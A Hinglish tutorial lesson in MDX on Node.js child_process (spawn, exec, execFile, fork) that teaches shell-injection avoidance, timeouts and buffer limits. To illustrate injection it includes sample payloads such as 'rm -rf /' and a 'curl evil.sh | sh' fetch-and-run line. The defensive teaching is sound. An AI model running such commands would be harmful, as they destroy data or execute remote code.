@@ -1,0 +1,295 @@
+---
+slug: "child-processes"
+title: "Child Processes"
+section: "nodejs"
+module: "concurrency-and-performance"
+order: 3
+difficulty: "advanced"
+readingTime: 17
+prerequisites: ["nodejs-is-single-threaded-what-that-means"]
+tags: ["nodejs", "child-process", "spawn", "exec", "fork", "security", "concurrency"]
+englishDefinition: "The child_process module runs a separate operating-system process from Node and connects to its standard input/output. spawn streams stdio and suits long-running commands or large output; exec runs a command through a shell and buffers all output up to a limit; execFile runs a binary directly with no shell, which is safer against injection; fork spawns another Node script with a built-in IPC message channel. Passing user input to exec is a shell-injection risk; use execFile or spawn with an argument array instead."
+interviewFrequency: "high"
+companies: ["TCS", "Infosys", "Wipro", "Cognizant", "Tech Mahindra"]
+---
+
+<SimpleDefinition>
+
+`child_process` lets Node start a **separate OS process** — a different program, or another copy of Node — and talk to it through its standard input/output streams. Four ways in: **`spawn`** (streams stdio, good for long-running commands and big output), **`exec`** (runs through a shell, buffers all output up to a limit), **`execFile`** (runs a binary directly, no shell — safer against injection), and **`fork`** (spawns another Node script plus an IPC message channel). Passing user input into `exec` is a classic shell-injection hole; use `execFile` / `spawn` with an argument array instead.
+
+</SimpleDefinition>
+
+## Hinglish Deep Explanation
+
+<Hinglish>
+
+`worker_threads` JavaScript ko alag thread par le jaata hai. `child_process` isse ek kadam aage — ek **poora alag OS process**. Wo process koi bhi program ho sakta hai: `ffmpeg`, `git`, `python`, ek shell command, ya khud Node ka ek aur instance. Interview mein ye "external command chalana", "shell injection", aur "process vs thread" ke sawaalon mein aata hai.
+
+### Ye kya hai — child_process
+
+`require("child_process")` chaar main functions deta hai:
+
+- **`spawn(cmd, argsArray, opts)`** — ek process launch karta hai aur uske `stdin`/`stdout`/`stderr` **streams** deta hai. Output aata rehta hai chunk-by-chunk. Long-running ya bada-output commands ke liye.
+- **`exec(cmdString, opts, cb)`** — ek **shell** (`/bin/sh` ya `cmd.exe`) launch karke poori command string usme chalata hai. Saara `stdout`/`stderr` **buffer** karta hai memory mein, phir callback ko ek baar deta hai. Default buffer limit **1 MB** (Node 12+; pehle 200 KB tha).
+- **`execFile(file, argsArray, opts, cb)`** — `exec` jaisa (buffered output) lekin **shell ke bina** — file directly execute hoti hai args array ke saath. Isliy shell metacharacters (`;`, `|`, `` ` ``, `$()`) ka koi matlab nahi — **injection-safe**.
+- **`fork(modulePath, argsArray, opts)`** — `spawn` ka special case jo ek naya **Node** process chalata hai aur automatically ek **IPC channel** set karta hai — parent aur child `process.send()` / `.on("message")` se structured messages exchange kar sakte hain.
+
+Sabhi ek `ChildProcess` object return karte hain jisme `.pid`, events (`exit`, `close`, `error`), aur stream handles hote hain.
+
+### Ye kyun exist karta hai
+
+Node ke andar sab kuch JS mein karna practical nahi. Video transcoding? `ffmpeg` decades se optimized hai. Git operations? `git` binary. Machine learning inference? Aksar ek Python script. `child_process` Node ko "orchestrator" banata hai — wo in tools ko chala kar, input feed karke, output collect karta hai, bina un tasks ko JS mein re-implement kiye.
+
+Doosra bada reason: **isolation**. Ek alag process ki apni memory hoti hai. Wo crash ho jaye — segfault, out-of-memory, `process.exit(1)` — to parent Node zinda rehta hai. Untrusted code, flaky native libraries, ya "kabhi-kabhi hang ho jaata hai" wale kaam ke liye ye crucial hai. `worker_threads` ye guarantee nahi deta (same process).
+
+### Internally kaise kaam karta hai
+
+- OS level par Node `fork()` + `exec()` (POSIX) ya `CreateProcess` (Windows) call karta hai. Naya process apna PID, apni virtual memory, apne file descriptors leke aata hai.
+- **stdio wiring:** by default child ke `stdin`/`stdout`/`stderr` Node ko pipes se connect hote hain. `opts.stdio` se control: `"pipe"` (default, Node ko streams), `"inherit"` (child directly terminal use kare), `"ignore"` (discard).
+- **`spawn` vs `exec`:** `exec` internally `spawn` ko `/bin/sh -c "<your string>"` ke saath call karta hai aur output accumulate karta hai. Isliy `exec` shell features (globbing, pipes, `&&`, env expansion) support karta hai — aur iseeliye injection-prone hai.
+- **`fork` ka IPC:** parent aur child ke beech ek extra file descriptor hota hai jispe V8-serialized messages jaate hain. `process.send(obj)` bhejta hai, `process.on("message", cb)` receive. Ye `worker_threads` ke `postMessage` jaisa dikhta hai lekin cross-process hai (thoda slower, fully isolated).
+- **Backpressure:** `spawn` ke streams normal Node streams hain — agar child tez likh raha hai aur tum dheere padh rahe ho, buffering rules apply. `exec` mein ye tumhare liye handle hota hai lekin `maxBuffer` cross karne par process **kill** ho jaata hai error ke saath.
+
+### Simple real-life analogy
+
+Tum ek project manager ho (Node process). Har kaam khud nahi karte:
+
+- **`spawn`** = ek contractor ko site par bhej diya jo lagataar update bhejta rehta hai (streaming) — lambi construction ke liye.
+- **`exec`** = ek chhota errand bola "ye poora instruction shopkeeper ko padh ke suna do aur jo laaye wo mujhe do" — shopkeeper (shell) instruction interpret karta hai. Agar instruction mein koi shararti line ghusa de, shopkeeper wo bhi kar dega (injection).
+- **`execFile`** = tum khud specific dukaan par jaake, specific items ki list (args array) thama dete ho — koi interpret karne wala beech mein nahi, isliy safe.
+- **`fork`** = ek junior manager (dusra Node) ko kaam de diya, aur uske saath ek dedicated intercom line (IPC) — dono structured messages bhej sakte hain.
+
+### Code — line by line
+
+```javascript
+const { spawn, execFile } = require("child_process");
+
+// spawn: stream a long-running command's output
+const proc = spawn("ffmpeg", ["-i", "in.mp4", "-vf", "scale=640:-1", "out.mp4"]);
+
+proc.stdout.on("data", (chunk) => process.stdout.write(chunk));
+proc.stderr.on("data", (chunk) => console.error("[ffmpeg] " + chunk));
+
+proc.on("error", (err) => {
+  console.error("spawn failed (binary missing?):", err.message);
+});
+
+proc.on("close", (code, signal) => {
+  if (code === 0) console.log("transcode ok");
+  else console.error("ffmpeg exited code " + code + " signal " + signal);
+});
+```
+
+- `spawn("ffmpeg", [args])` — `ffmpeg` binary directly, args ek **array** ke roop mein. Koi shell nahi — filename mein space ya `;` ho to bhi safe.
+- `proc.stdout.on("data", ...)` — output chunks aate hi milte hain, memory mein poora accumulate nahi hota. Bade output (hours of logs) ke liye yahi sahi.
+- `proc.stderr` — `ffmpeg` apna progress `stderr` par likhta hai; alag stream.
+- `proc.on("error", ...)` — ye **spawn hi fail** hone par (binary nahi mila, permission nahi) fire hota hai — command ke non-zero exit se alag.
+- `proc.on("close", (code, signal))` — process khatam. `code` exit code (`0` = success), `signal` agar kill hua (jaise `"SIGTERM"`). `"exit"` bhi hai lekin `"close"` tab fire hota hai jab stdio streams bhi band ho gaye.
+
+```javascript
+// execFile: safe way to pass user input
+function runGitLog(repoPath, authorFilter, cb) {
+  execFile(
+    "git",
+    ["-C", repoPath, "log", "--author", authorFilter, "--oneline", "-n", "50"],
+    { timeout: 5000, maxBuffer: 2 * 1024 * 1024 },
+    (err, stdout, stderr) => {
+      if (err) return cb(err);
+      cb(null, stdout.trim().split("\n"));
+    }
+  );
+}
+```
+
+- `execFile("git", [args])` — `authorFilter` user se aa raha ho to bhi safe: wo ek plain argument hai, shell use nahi ho raha, `authorFilter = "x\"; rm -rf /"` ka koi asar nahi.
+- `{ timeout: 5000 }` — 5s baad process ko `SIGTERM` bhejta hai (hang protection).
+- `{ maxBuffer: 2MB }` — output isse bada hua to error `ERR_CHILD_PROCESS_STDOUT_MAXBUFFER` aur process kill. Bade output ke liye `execFile` mat use karo — `spawn` + stream.
+
+### Day-to-day use
+
+- Media: `ffmpeg` (transcode), `imagemagick` / `sharp`-cli (resize), `libreoffice --headless` (docx→pdf).
+- Dev tooling / CI: `git`, `npm`, `docker`, `terraform` commands orchestrate karna.
+- Language bridges: ek `python` / `Rscript` script chalana jo model inference ya stats kare.
+- Isolation: untrusted user-submitted code ek sandboxed child mein run karna (plus OS-level sandboxing).
+- Parallel Node work: `fork` se N Node children, har ek ka apna event loop — heavy background jobs.
+
+### Kab use karna chahiye
+
+- Kaam ek **alag program** hai jo already exist karta hai (`ffmpeg`, `git`) — use JS mein re-implement mat karo.
+- Tumhe **crash isolation** chahiye — code segfault ya OOM kar sakta hai aur parent zinda rehna chahiye.
+- Tumhe **untrusted code** chalana hai — alag process + OS sandbox.
+- Tumhe ek **alag runtime** (Python, Go binary) integrate karna hai.
+- `fork`: parent–child ke beech ongoing structured message-passing chahiye aur full process isolation acceptable/wanted hai.
+
+### Kab use nahi karna chahiye
+
+- **CPU-bound JavaScript** jo tumne khud likha hai — `worker_threads` lighter hai (naya OS process aur V8 boot nahi).
+- **I/O-bound kaam** — DB, HTTP, file — already non-blocking, child process sirf overhead.
+- **Poore HTTP server ko multi-core scale karna** — `cluster` (jo internally `child_process` use karta hai lekin port-sharing manage karke).
+- **Chhote, frequent tasks** — process spawn (~tens of ms + OS overhead) har call par mehenga; worker pool ya in-process solution behtar.
+- **`exec` with any user input** — injection. `execFile`/`spawn` + args array.
+
+### Pros and cons
+
+**Pros**
+
+- Kisi bhi language/tool ko integrate kar sakte ho
+- Poori crash/memory isolation — child gira, parent safe
+- `fork` se easy structured IPC between Node processes
+- OS-level resource limits (nice, cgroups) child par laga sakte ho
+
+**Cons**
+
+- Spawn cost sabse zyada (naya process + naya address space, `fork` mein naya V8 bhi)
+- IPC serialization cross-process — `worker_threads` se slower
+- `exec` shell injection risk
+- `exec`/`execFile` ka `maxBuffer` — bhool gaye to bade output par silent-ish kill
+- stdio backpressure, zombie processes, signal handling — khud manage karna padta hai
+- Windows par shell/path behavior alag (`shell: true` kabhi zaroori)
+
+### Alternatives
+
+- **`worker_threads`** — CPU-bound JS same process mein, lighter.
+- **Native addon / native npm lib** (`sharp`, `bcrypt`) — external binary ke bina wahi kaam libuv thread pool par.
+- **`cluster`** — HTTP server multi-core scaling.
+- **Message queue + separate service** — child process ke bajaye ek proper worker service jo independently deploy/scale ho.
+- **`execa` (npm)** — `child_process` ke upar ek friendlier promise-based wrapper (better defaults, cross-platform, no shell by default).
+
+### Interview mein "`exec` kyun nahi use kiya, `execFile` kyun?"
+
+> "Command mein ek parameter user ke input se aa raha tha — ek filename filter. `exec` poori string ko `/bin/sh -c` ko de deta, to koi `"; rm -rf /"` type input shell command injection ban jaata. `execFile` shell ko bypass karta hai: binary directly chalti hai aur user ka input ek plain argument rehta hai, chahe usme `;` ya backticks hon. Output chhota aur bounded tha isliy buffered `execFile` theek tha; agar output bada ya streaming hota — jaise `ffmpeg` logs — to main `spawn` use karta aur stdout ko stream karta, `maxBuffer` crash se bachne ke liye. `exec` maine sirf tab consider kiya jab mujhe shell pipeline (`a | b`) genuinely chahiye tha aur poori command string hard-coded thi, koi user input nahi."
+
+</Hinglish>
+
+<Callout type="tip">
+
+`exec` ka mental model: "poori string ek shell ko de do." Iska matlab har shell metacharacter (`;`, `&&`, `|`, `$()`, `` ` ``, `>` ) active hai. Agar us string mein kahin bhi user-controlled data hai — even ek "sirf filename" — to wo injection vector hai. Default choice `execFile` ya `spawn` with an args array rakho; `exec` sirf hard-coded commands ke liye.
+
+</Callout>
+
+## Real World Example
+
+<RealWorld company="Ek document-conversion microservice">
+
+Ek team ko user-uploaded `.docx` files ko PDF banana tha. JS libraries fidelity kharab de rahi thi, to unhone `libreoffice --headless --convert-to pdf` ko `execFile` se chalaya (kabhi shell nahi, filename user-controlled tha). Har conversion ek fresh child process — agar LibreOffice ek corrupt file par crash ya hang kar jaye, `{ timeout: 30000 }` use `SIGTERM` bhej deta aur main service unaffected rehti. Output PDF disk par likha jaata tha (stdout par nahi), to `maxBuffer` issue nahi tha. High volume par unhone concurrency ko ek semaphore se cap kiya (max 4 parallel `libreoffice`) taaki box ki RAM na bhare.
+
+</RealWorld>
+
+<RealWorld company="Build systems / CI runners (e.g. Jenkins-style agents in Node)">
+
+Node-based CI agents har build step ke liye `spawn` use karte hain — `git clone`, `npm ci`, `docker build`. `spawn` isliy (na ki `exec`) kyunki: output huge aur streaming hota hai (live logs UI mein chahiye), builds ghanton chal sakte hain, aur exit code precisely chahiye hota hai step pass/fail decide karne ke liye. Commands args-array form mein banti hain taaki branch names ya env values (jo repo config se aate hain) shell injection na banein. Har step ka apna `stdio` capture hota hai aur `SIGTERM`/`SIGKILL` escalation hota hai jab user build cancel kare.
+
+</RealWorld>
+
+## Numbers That Matter
+
+<Numbers>
+
+- `exec` / `execFile` default `maxBuffer`: **1 MB** (Node 12+). Pehle **200 KB** tha. Cross karne par process kill + `ERR_CHILD_PROCESS_..._MAXBUFFER`.
+- Process spawn cost: roughly **tens of ms** for a plain binary; `fork` (naya Node + V8) **50-150 ms+**. worker_threads se noticeably bhaari.
+- IPC (`fork` `process.send`): messages V8-serialized cross-process — throughput `worker_threads` `postMessage` se kam, latency zyada.
+- `spawn` streams: default `highWaterMark` **64 KB** per stream — iske baad backpressure.
+- Default `timeout`: **none** (`0`). Agar set nahi kiya to ek hung child hamesha chalti rahegi. Hamesha `{ timeout }` ya manual `kill()` rakho.
+- Signals: `SIGTERM` (graceful, default `kill()`), `SIGKILL` (force, ignore nahi hota). Escalation gap typically **5-10 s**.
+
+</Numbers>
+
+## Interview Angle
+
+<InterviewAngle>
+
+Ye topic senior/backend interviews mein 3 shakal mein aata hai: (1) "`spawn` vs `exec` vs `execFile` vs `fork` — kab kya?", (2) ek security question — "ye code shell injection ke liye vulnerable hai, fix karo", (3) "process vs thread — `child_process` vs `worker_threads`".
+
+Model answer ka shape (tool choice):
+
+1. **`spawn`** — long-running, big/streaming output, exact exit code chahiye. Default choice for external commands.
+2. **`execFile`** — chhota bounded output, no shell needed → safest quick option, user input safe.
+3. **`exec`** — sirf jab genuine shell features (pipes, globbing) chahiye **aur** poori command hard-coded. Never with user input.
+4. **`fork`** — parent–child dono Node, ongoing IPC messaging chahiye.
+5. **`child_process` vs `worker_threads`** — external program ya crash isolation → child_process; CPU-bound JS you wrote, same process ok → worker_threads.
+
+Security points: user input → `execFile`/`spawn` + args array, never string concatenation into `exec`. Always `{ timeout }`. Bound `maxBuffer` ya stream. Validate/allowlist the binary path.
+
+Red flags: `exec("convert " + userFile + " out.png")` ko safe samajhna; `maxBuffer` ke baare mein na jaanna; "child process ek thread hai" bolna.
+
+</InterviewAngle>
+
+## Common Mistakes
+
+<Mistake>
+
+**User input ko `exec` ki command string mein concat karna.** `exec("git log --author=" + author)` — agar `author` mein `` `; curl evil.sh | sh` `` ho, wo shell mein execute ho jaata hai. `exec` poori string `/bin/sh -c` ko deta hai. Fix: `execFile("git", ["log", "--author=" + author])` ya `spawn` — args array shell ko bypass karta hai aur input ko data rakhta hai, code nahi.
+
+</Mistake>
+
+<Mistake>
+
+**Bade ya streaming output ke liye `exec`/`execFile` use karna.** Ye poora output memory mein buffer karte hain. Default `maxBuffer` **1 MB** — ek command jo 5 MB logs deti hai wo process ko kill kar degi `ERR_CHILD_PROCESS_STDOUT_MAXBUFFER` ke saath, aksar aadha output milne ke baad. Bade/unbounded/streaming output → `spawn` + `stdout.on("data")`.
+
+</Mistake>
+
+<Mistake>
+
+**`error` aur `close`/`exit` events handle na karna.** `error` tab fire hota hai jab spawn hi fail ho (binary missing, EACCES). `close` par tumhe `code` aur `signal` milte hain — inhe check kiye bina tum success maan lete ho jabki command non-zero exit hui. `if (code !== 0)` ke bina failures silently pass ho jaate hain.
+
+</Mistake>
+
+<Mistake>
+
+**Timeout na lagana.** Default `timeout` `0` hai — matlab kabhi nahi. Ek external tool jo ek bad input par hang ho gaya, wo hamesha chalta rahega, memory/handle leak karega, aur agar tum uske exit ka wait kar rahe ho to request kabhi complete nahi hogi. Hamesha `{ timeout: N }` (ya manual `setTimeout` → `child.kill()`), aur `SIGTERM` ke baad `SIGKILL` escalation.
+
+</Mistake>
+
+<Mistake>
+
+**`child_process` ko CPU-bound JS ke liye reach karna jab `worker_threads` chahiye tha.** Agar bhaari kaam tumhara apna JavaScript hai (bcrypt loop, JSON crunching), naya OS process + naya V8 boot karna waste hai — `fork` ka startup 50-150 ms, IPC cross-process slow. `worker_threads` same process mein, halka, faster messaging. `child_process` tabhi jab external program ya crash isolation genuinely chahiye.
+
+</Mistake>
+
+## Diagram
+
+<Diagram
+  chart={`
+flowchart TD
+    A["Node ko ek external kaam karwana hai"] --> B{"Kya chahiye?"}
+    B -->|"Long-running / bada ya streaming output / exact exit code"| C["spawn(bin, argsArray) — stream stdout/stderr"]
+    B -->|"Chhota bounded output, no shell features"| D["execFile(bin, argsArray, cb) — buffered, injection-safe"]
+    B -->|"Genuine shell pipeline AND command fully hard-coded"| E["exec(str, cb) — /bin/sh -c str"]
+    B -->|"Doosra Node script + ongoing message-passing"| F["fork(modulePath) — auto IPC channel"]
+    C --> G["ChildProcess: pid, stdio streams, on(close, code, signal)"]
+    D --> G
+    E --> G
+    F --> H["process.send() / on(message) dono taraf"]
+    E -.->|"user input string mein = injection"| X["AVOID with untrusted data"]
+`}
+  caption="Default external-command choice spawn ya execFile hai; exec sirf hard-coded shell pipelines ke liye; fork Node-to-Node IPC ke liye."
+/>
+
+## Quick Revision
+
+<QuickRevision>
+
+- **`spawn(bin, [args])`** — streams stdio; long-running / big / streaming output; exact exit code. Default choice for external commands.
+- **`exec(str, cb)`** — `/bin/sh -c str`, output buffered (default `maxBuffer` **1 MB**). Shell features milte hain — aur injection risk. Sirf hard-coded commands.
+- **`execFile(bin, [args], cb)`** — no shell, buffered output. User input **safe** yahan. Chhote bounded output ke liye.
+- **`fork(module)`** — naya **Node** process + automatic **IPC** (`process.send` / `on("message")`).
+- **Injection fix:** user input kabhi `exec` string mein nahi — `execFile`/`spawn` + args array.
+- Hamesha **`{ timeout }`** rakho (default `0` = kabhi nahi) + `SIGTERM`→`SIGKILL` escalation.
+- **`error`** = spawn fail (binary missing); **`close`** = `(code, signal)` — hamesha `code === 0` check.
+- Bade output → `execFile` **nahi** (`maxBuffer` kill) → `spawn` + stream.
+- **`child_process` vs `worker_threads`:** external program / crash isolation → child_process; CPU-bound JS you wrote → worker_threads (lighter).
+- Frequent small tasks → process spawn mehenga; pool ya in-process solution socho.
+
+</QuickRevision>
+
+## Practice
+
+<Callout type="tip">
+
+**Chhota:** `execFile("node", ["-v"], cb)` chalao aur version print karo. Phir jaan-boojh ke `execFile("nodeXYZ", ...)` (galat binary) chalao aur `error` event / `err` argument observe karo — note karo ye non-zero exit se alag hai.
+
+**Medium:** Ek function `safeGrep(pattern, file)` likho jo `spawn("grep", [pattern, file])` use kare, stdout stream karke lines count kare, `{ timeout: 3000 }` rakhe, aur exit code `0`/`1`/`2` (match / no match / error) ko meaningful result mein map kare. Phir isko `exec("grep " + pattern + " " + file)` se compare karo aur likho ki `pattern = ". ; echo hacked"` dono mein kya karta hai.
+
+**Bada:** `fork` se ek chhota job system banao: `worker.js` ek Node script jo `process.on("message", job => ...)` par ek CPU task (prime count) kare aur `process.send(result)` kare. Parent 4 forks ka pool rakhe, incoming jobs ko idle child ko de, aur ek child crash (`process.exit(1)` on a "poison" job) par use replace kare. Same design ka `worker_threads` version bana ke messaging latency aur memory (RSS) compare karo.
+
+</Callout>
